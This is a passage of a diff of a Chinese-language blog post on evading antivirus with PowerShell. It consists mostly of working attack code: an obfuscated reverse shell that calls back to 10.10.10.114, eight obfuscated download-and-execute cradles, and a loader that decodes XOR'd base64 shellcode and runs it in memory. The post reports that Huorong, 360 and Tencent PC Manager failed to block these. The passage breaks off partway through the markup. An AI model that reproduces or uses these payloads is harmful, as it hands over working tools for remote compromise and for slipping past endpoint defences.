 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-Variable</span> <span class="literal">-Name</span> client <span class="literal">-Value</span> (<span class="built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="string">&quot;10.10.10.114&quot;</span>, <span class="number">53</span>));</span><br><span class="line">&amp;(<span class="string">&#x27;sV&#x27;</span>) (<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;w4c&#x27;</span>) ( [<span class="type">tYPE</span>](<span class="string">&quot;&#123;1&#125;&#123;3&#125;&#123;2&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;nG&#x27;</span>,<span class="string">&#x27;TE&#x27;</span>,(<span class="string">&quot;&#123;1&#125;&#123;2&#125;&#123;0&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;En&#x27;</span>,<span class="string">&#x27;cOd&#x27;</span>),<span class="string">&#x27;Xt.&#x27;</span>) ) ;&amp;(<span class="string">&quot;&#123;0&#125;&#123;2&#125;&#123;1&#125;&#123;3&#125;&quot;</span><span class="operator">-f</span>(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;Set&#x27;</span>,<span class="string">&#x27;-&#x27;</span>),<span class="string">&#x27;b&#x27;</span>,(<span class="string">&quot;&#123;1&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;aria&#x27;</span>,<span class="string">&#x27;V&#x27;</span>),<span class="string">&#x27;le&#x27;</span>) <span class="literal">-Value</span> (<span class="variable">$</span>&#123;C`L`IEnT&#125;.(<span class="string">&quot;&#123;1&#125;&#123;2&#125;&#123;0&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;am&#x27;</span>,(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;etS&#x27;</span>),<span class="string">&#x27;tre&#x27;</span>).<span class="string">&quot;i`N`VoKe&quot;</span>()) <span class="literal">-Name</span> (<span class="string">&quot;&#123;0&#125;&#123;1&#125;&#123;2&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;s&#x27;</span>,(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;tr&#x27;</span>,<span class="string">&#x27;ea&#x27;</span>),<span class="string">&#x27;m&#x27;</span>);[<span class="built_in">byte</span>[]]<span class="variable">$</span>&#123;b`Yt`es&#125; =<span class="number">0</span>..<span class="number">65535</span>|&amp;(<span class="string">&#x27;%&#x27;</span>)&#123;<span class="number">0</span>&#125;;<span class="keyword">while</span>((.(<span class="string">&quot;&#123;0&#125;&#123;2&#125;&#123;3&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;S&#x27;</span>,(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;able&#x27;</span>),<span class="string">&#x27;et&#x27;</span>,(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;Var&#x27;</span>)) <span class="literal">-Name</span> (<span class="string">&#x27;i&#x27;</span>) <span class="literal">-Value</span>(<span class="variable">$</span>&#123;s`T`Ream&#125;.(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;Rea&#x27;</span>,<span class="string">&#x27;d&#x27;</span>).<span class="string">&quot;IN`Voke&quot;</span>(<span class="variable">$</span>&#123;b`Y`TES&#125;, <span class="number">0</span>,<span class="variable">$</span>&#123;By`Tes&#125;.<span class="string">&quot;LeNg`TH&quot;</span>))) <span class="operator">-ne</span> <span class="number">0</span>)&#123;;&amp;(<span class="string">&quot;&#123;2&#125;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;Va&#x27;</span>,(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;ria&#x27;</span>,<span class="string">&#x27;ble&#x27;</span>),(<span class="string">&quot;&#123;1&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;t-&#x27;</span>,<span class="string">&#x27;Se&#x27;</span>)) <span class="literal">-Name</span> (<span class="string">&quot;&#123;1&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;ta&#x27;</span>,<span class="string">&#x27;da&#x27;</span>) <span class="literal">-Value</span> ((&amp;(<span class="string">&quot;&#123;2&#125;&#123;1&#125;&#123;0&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;ect&#x27;</span>,(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;w-&#x27;</span>,<span class="string">&#x27;Obj&#x27;</span>),<span class="string">&#x27;Ne&#x27;</span>) <span class="literal">-TypeName</span> (<span class="string">&quot;&#123;4&#125;&#123;2&#125;&#123;1&#125;&#123;0&#125;&#123;5&#125;&#123;3&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;IEn&#x27;</span>,<span class="string">&#x27;I&#x27;</span>,(<span class="string">&quot;&#123;1&#125;&#123;0&#125;&#123;2&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;xt&#x27;</span>,<span class="string">&#x27;ASC&#x27;</span>),(<span class="string">&quot;&#123;1&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;ding&#x27;</span>,<span class="string">&#x27;o&#x27;</span>),(<span class="string">&quot;&#123;1&#125;&#123;2&#125;&#123;0&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;Sys&#x27;</span>,<span class="string">&#x27;tem.T&#x27;</span>),<span class="string">&#x27;c&#x27;</span>)).<span class="string">&quot;g`e`TSTRiNg&quot;</span>(<span class="variable">$</span>&#123;bYT`Es&#125;,<span class="number">0</span>, <span class="variable">$</span>&#123;I&#125;));.(<span class="string">&quot;&#123;1&#125;&#123;2&#125;&#123;0&#125;&#123;3&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;Se&#x27;</span>,(<span class="string">&quot;&#123;1&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;t-Va&#x27;</span>),(<span class="string">&quot;&#123;1&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;ble&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)) <span class="literal">-Value</span> (.(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;ie&#x27;</span>,<span class="string">&#x27;x&#x27;</span>) <span class="variable">$</span>&#123;D`ATA&#125; <span class="number">2</span>&gt;&amp;<span class="number">1</span> | .(<span class="string">&quot;&#123;1&#125;&#123;2&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;Ou&#x27;</span>,(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;t-Stri&#x27;</span>,<span class="string">&#x27;n&#x27;</span>)) ) <span class="literal">-Name</span>(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span> (<span class="string">&quot;&#123;1&#125;&#123;2&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;se&#x27;</span>,<span class="string">&#x27;ndba&#x27;</span>),<span class="string">&#x27;k&#x27;</span>);.(<span class="string">&quot;&#123;0&#125;&#123;3&#125;&#123;1&#125;&#123;2&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;Se&#x27;</span>,(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;Va&#x27;</span>,<span class="string">&#x27;riabl&#x27;</span>),<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;t-&#x27;</span>) <span class="literal">-Value</span> (<span class="variable">$</span>&#123;sE`NDBack&#125; + <span class="string">&quot;PS &quot;</span> + (.(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;wd&#x27;</span>)).<span class="string">&quot;P`ATH&quot;</span> + <span class="string">&quot;&gt; &quot;</span>) <span class="literal">-Name</span> (<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;se&#x27;</span>,(<span class="string">&quot;&#123;0&#125;&#123;2&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;n&#x27;</span>,<span class="string">&#x27;ack2&#x27;</span>,<span class="string">&#x27;db&#x27;</span>));&amp;(<span class="string">&quot;&#123;1&#125;&#123;2&#125;&#123;3&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;le&#x27;</span>,(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;Set-&#x27;</span>,<span class="string">&#x27;Va&#x27;</span>),<span class="string">&#x27;ri&#x27;</span>,<span class="string">&#x27;ab&#x27;</span>) <span class="literal">-Name</span>(<span class="string">&quot;&#123;1&#125;&#123;0&#125;&quot;</span><span class="operator">-f</span> (<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;ndbyt&#x27;</span>,<span class="string">&#x27;e&#x27;</span>),<span class="string">&#x27;se&#x27;</span>) <span class="literal">-Value</span> (( ( .(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;tEm&#x27;</span>) (<span class="string">&quot;&#123;4&#125;&#123;2&#125;&#123;1&#125;&#123;0&#125;&#123;3&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;W4&#x27;</span>,<span class="string">&#x27;Ble:p&#x27;</span>,<span class="string">&#x27;IA&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;vaR&#x27;</span>)).<span class="string">&quot;vAL`UE&quot;</span>::<span class="string">&quot;Asc`II&quot;</span>).(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span>(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;Get&#x27;</span>,<span class="string">&#x27;By&#x27;</span>),<span class="string">&#x27;tes&#x27;</span>).<span class="string">&quot;in`VOKE&quot;</span>(<span class="variable">$</span>&#123;SEN`D`BAck2&#125;));<span class="variable">$</span>&#123;str`eam&#125;.(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;Wri&#x27;</span>,<span class="string">&#x27;te&#x27;</span>).<span class="string">&quot;InV`OKE&quot;</span>(<span class="variable">$</span>&#123;S`en`D`BYTE&#125;,<span class="number">0</span>,<span class="variable">$</span>&#123;SeN`D`ByTe&#125;.<span class="string">&quot;lE`NGtH&quot;</span>);<span class="variable">$</span>&#123;ST`R`EaM&#125;.(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span> (<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;F&#x27;</span>,<span class="string">&#x27;lus&#x27;</span>),<span class="string">&#x27;h&#x27;</span>).<span class="string">&quot;IN`V`oKe&quot;</span>()&#125;;<span class="variable">$</span>&#123;cl`I`eNT&#125;.(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> <span class="operator">-f</span><span class="string">&#x27;C&#x27;</span>,(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;los&#x27;</span>,<span class="string">&#x27;e&#x27;</span>)).<span class="string">&quot;I`N`Voke&quot;</span>()</span><br></pre></td></tr></table></figure>
-
-<p>在目标机器上运行 </p>
+<p>在目标机器上运行</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Powershell -ExecutionPolicy Bypass</span><br><span class="line">.\11.ps1</span><br></pre></td></tr></table></figure>
-
 <p>在kali上进行监听 <code>nc -lvvp 53</code></p>
-<p><img src="/posts/adb63639/16.png" alt="截图"></p>
+<figure>
+<img src="/posts/adb63639/16.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
 <p>火绒不拦截</p>
 <p>在win7虚拟机下 360不拦截</p>
-<p><img src="/posts/adb63639/17.png" alt="截图"></p>
-<p>但是现在360已经拦截了powershell 只要开启360(在win7下会拦截，但是在win10测试时没拦截) 就无法去调用powershell</p>
-<br>
-
-<h3 id="PS1源文件命令混淆-行为免杀"><a href="#PS1源文件命令混淆-行为免杀" class="headerlink" title="PS1源文件命令混淆(行为免杀)"></a>PS1源文件命令混淆(行为免杀)</h3><p>尽管powershell代码自身免杀，但是在通过powershell远程下载或者执行shellcode时，很容易被杀软发现拦截</p>
+<figure>
+<img src="/posts/adb63639/17.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<p>但是现在360已经拦截了powershell
+只要开启360(在win7下会拦截，但是在win10测试时没拦截)
+就无法去调用powershell</p>
+<p><br></p>
+<h3 id="ps1源文件命令混淆行为免杀">PS1源文件命令混淆(行为免杀)</h3>
+<p>尽管powershell代码自身免杀，但是在通过powershell远程下载或者执行shellcode时，很容易被杀软发现拦截</p>
 <p>常用的powershell去执行命令</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell -NoExit &quot;IEX(New-Object Net.WebClient).DownloadString.(&#x27;&#x27;http://10.10.10.114/shell.ps1&#x27;&#x27;))&quot;</span><br><span class="line"></span><br><span class="line">powershell -NoExit &quot;Invoke-Expression (New-Object Net.WebClient).&quot;D o wn l oad Str in g&quot;(&#x27;h&#x27;+&#x27;ttp://127.0.0.1:8000/1.txt&#x27;)&quot;</span><br></pre></td></tr></table></figure>
-
-<br>
-
-<p><img src="/posts/adb63639/18.png" alt="截图"></p>
-<p><img src="/posts/adb63639/19.png" alt="截图"></p>
+<p><br></p>
+<figure>
+<img src="/posts/adb63639/18.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<figure>
+<img src="/posts/adb63639/19.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
 <p>杀软便会对齐进行拦截</p>
 <p>通常情况下 可以通过替换函数进行bypass</p>
-<p><code>Invoke-Expression (New-Object System.Net.WebClient).DownloadString(&quot;http://127.0.0.1:8000/1.txt&quot;)</code></p>
-<p><code>powershell -NoExit &quot;IEX(New-Object Net.WebClient).DownloadString.(&#39;&#39;http://10.10.10.114/shell.ps1&#39;&#39;))&quot;</code></p>
-<br>
-
-<p><img src="/posts/adb63639/20.png" alt="截图"></p>
-<br>
-
+<p><code>Invoke-Expression (New-Object System.Net.WebClient).DownloadString("http://127.0.0.1:8000/1.txt")</code></p>
+<p><code>powershell -NoExit "IEX(New-Object Net.WebClient).DownloadString.(''http://10.10.10.114/shell.ps1''))"</code></p>
+<p><br></p>
+<figure>
+<img src="/posts/adb63639/20.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<p><br></p>
 <ul>
 <li>1.去掉System关键词</li>
 </ul>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&quot;http://10.10.10.114:8000/1.txt&quot;</span>)</span><br></pre></td></tr></table></figure>
-
 <ul>
 <li>2.使用字符串连接+号连接</li>
 </ul>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">&#x27;h&#x27;</span>+<span class="string">&#x27;ttp://10.10.10.114:8000/1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
 <ul>
 <li>3.使用Invoke方法</li>
 </ul>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).(<span class="string">&quot;DownloadString&quot;</span>).Invoke(<span class="string">&#x27;h&#x27;</span>+<span class="string">&#x27;ttp://10.10.10.114:8000/1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
 <ul>
 <li>4.变量替代</li>
 </ul>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ds</span>=<span class="string">&quot;Down&quot;</span>+<span class="string">&quot;loadString&quot;</span>;</span><br><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).<span class="variable">$ds</span>.Invoke(<span class="string">&#x27;h&#x27;</span>+<span class="string">&#x27;ttp://10.10.10.114:8000/1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
 <ul>
 <li>5.关键词使用单双引号引起来</li>
 </ul>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).<span class="string">&quot;DownloadString&quot;</span>(<span class="string">&#x27;h&#x27;</span>+<span class="string">&#x27;ttp://10.10.10.114/powershell&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
 <ul>
 <li>6.转义符号</li>
 </ul>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-Expression</span> (<span class="built_in">New-Object</span> Net.WebClient).<span class="string">&quot;D o wn l oad Str in g&quot;</span>(<span class="string">&#x27;h&#x27;</span>+<span class="string">&#x27;ttp://10.10.10.114:8000/1.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
 <ul>
 <li>7.字符串反转</li>
 </ul>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$re</span>= <span class="string">&quot;)&#x27;txt.1/0008:411.01.01.01//:ptth&#x27;(gnirtSdaolnwoD.)tneilCbeW.teN tcejbO-weN(&quot;</span>;</span><br><span class="line">(<span class="variable">$re</span>[-<span class="number">1</span><span class="type">..</span>-(<span class="variable">$re</span><span class="type">.Length</span>)] <span class="operator">-Join</span> <span class="string">&#x27;&#x27;</span>) | <span class="built_in">IEX</span></span><br></pre></td></tr></table></figure>
-
 <ul>
 <li>8.编码执行</li>
 </ul>
 <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$command</span> = <span class="string">&quot;Invoke-Expression (New-Object Net.WebClient).DownloadString(&#x27;h&#x27;+&#x27;ttp://10.10.10.114:8000/1.txt&#x27;)&quot;</span></span><br><span class="line"><span class="variable">$bytes</span> = [<span class="type">System.Text.Encoding</span>]::Unicode.GetBytes(<span class="variable">$command</span>)</span><br><span class="line"><span class="variable">$encodedCommand</span> = [<span class="type">Convert</span>]::ToBase64String(<span class="variable">$bytes</span>)</span><br><span class="line">powershell.exe <span class="literal">-EncodedCommand</span> <span class="variable">$encodedCommand</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/posts/adb63639/21.png" alt="截图"></p>
+<figure>
+<img src="/posts/adb63639/21.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
 <p>混淆之后不会被火绒拦截</p>
-<p><img src="/posts/adb63639/22.png" alt="截图"></p>
+<figure>
+<img src="/posts/adb63639/22.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
 <p>混淆后腾讯管家也可以绕过</p>
-<h3 id="base64编码powershell-随机分段-垃圾注释"><a href="#base64编码powershell-随机分段-垃圾注释" class="headerlink" title="base64编码powershell+随机分段+垃圾注释"></a>base64编码powershell+随机分段+垃圾注释</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-StrictMode</span> <span class="literal">-Version</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$Dolt</span> = <span class="string">@&#x27;</span></span><br><span class="line"><span class="string">function func_get_proc_address &#123;</span></span><br><span class="line"><span class="string">	Param ($var_module, $var_procedure)		</span></span><br><span class="line"><span class="string">	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object &#123; $_.GlobalAssemblyCache -And $_.Location.Split(&#x27;\\&#x27;)[-1].Equals(&#x27;System.dll&#x27;) &#125;).GetType(&#x27;Microsoft.Win32.UnsafeNativeMethods&#x27;)</span></span><br><span class="line"><span class="string">	$var_gpa = $var_unsafe_native_methods.GetMethod(&#x27;GetProcAddress&#x27;, [Type[]] @(&#x27;System.Runtime.InteropServices.HandleRef&#x27;, &#x27;string&#x27;))</span></span><br><span class="line"><span class="string">	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod(&#x27;GetModuleHandle&#x27;)).Invoke($null, @($var_module)))), $var_procedure))</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function func_get_delegate_type &#123;</span></span><br><span class="line"><span class="string">	Param (</span></span><br><span class="line"><span class="string">		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,</span></span><br><span class="line"><span class="string">		[Parameter(Position = 1)] [Type] $var_return_type = [Void]</span></span><br><span class="line"><span class="string">	)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName(&#x27;ReflectedDelegate&#x27;)), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule(&#x27;InMemoryModule&#x27;, $false).DefineType(&#x27;MyDelegateType&#x27;, &#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;, [System.MulticastDelegate])</span></span><br><span class="line"><span class="string">	$var_type_builder.DefineConstructor(&#x27;RTSpecialName, HideBySig, Public&#x27;, [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span></span><br><span class="line"><span class="string">	$var_type_builder.DefineMethod(&#x27;Invoke&#x27;, &#x27;Public, HideBySig, NewSlot, Virtual&#x27;, $var_return_type, $var_parameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	return $var_type_builder.CreateType()</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Byte[]]$var_code = [System.Convert]::FromBase64String(&#x27;38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2Etx0dHR0dEsZdVqE3PbKpyMjI3gS6nJySSByckt3PCMjcHNLdKq85dz2yFN4EvFxSyMhY6dxcXFwcXNLyHYNGNz2quWg4HMS3HR0SdxwdUsOJTtY3Pam4yyn4CIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FeUEtzKsiIjI8rqIiMjy6jc3NwMT2R3diMWbAJzBmNic3gXf3N5exYXC3N9ChRgYAoUXgdmamBicQ5wd2JtZ2JxZw5ibXdqdWpxdnAOd2Zwdw5lam9mAgdrCGsJIxZsAnMGI3ZQRlEOYkRGTVcZA25MWUpPT0IMFg0TAwtATE5TQldKQU9GGANucGpmAxoNExgDdEpNR0xUUANtdwMVDRIYA3dRSkdGTVcMFg0TCi4pIxZsAnMGY2JzeBd/c3l7FhcLc30KFGBgChReB2ZqYGJxDnB3Ym1nYnFnDmJtd2p1anF2cA53ZnB3DmVqb2YCB2sIawkjFmwCcwZjYnN4F39zeXsWFwtzfQoUYGAKFF4HZmpgYnEOcHdibWdicWcOYm13anVqcXZwDndmcHcOZWpvZgIHawhrCSMWbAJzBmNic3gXf3N5exYXC3N9ChRgYAoUXgdmamBicQ5wd2JtZ2JxZw5ibXdqdWpxdnAOd2Zwdw5lam9mAgdrCGsJIxZsAnMGY2JzeBd/c3l7FhcLc30KFCNL05aBddz2SWNLIzMjI0sjI2MjdEt7h3DG3PawmiMjIyMi+nJwqsR0SyMDIyNwdUsxtarB3Pam41flqCQi4KbjVsZ74MuK3tzcEhMNEhMNEhMNEhIXIyMjIyM=&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">for ($x = 0; $x -lt $var_code.Count; $x++) &#123;</span></span><br><span class="line"><span class="string">	$var_code[$x] = $var_code[$x] -bxor 35</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))</span></span><br><span class="line"><span class="string">$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)</span></span><br><span class="line"><span class="string">[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))</span></span><br><span class="line"><span class="string">$var_runme.Invoke([IntPtr]::Zero)</span></span><br><span class="line"><span class="string">&#x27;@</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> ([<span class="built_in">Int</span><span class="type">Ptr</span>]::size <span class="operator">-eq</span> <span class="number">8</span>) &#123;</span><br><span class="line">	<span class="built_in">start-job</span> &#123; <span class="keyword">param</span>(<span class="variable">$a</span>) <span class="built_in">IEX</span> <span class="variable">$a</span> &#125; <span class="literal">-RunAs32</span> <span class="literal">-Argument</span> <span class="variable">$Dolt</span>  | <span class="built_in">wait-job</span> | <span class="built_in">Receive-Job</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="built_in">IEX</span> <span class="variable">$Dolt</span>  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
+<h3 id="base64编码powershell随机分段垃圾注释">base64编码powershell+随机分段+垃圾注释</h3>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 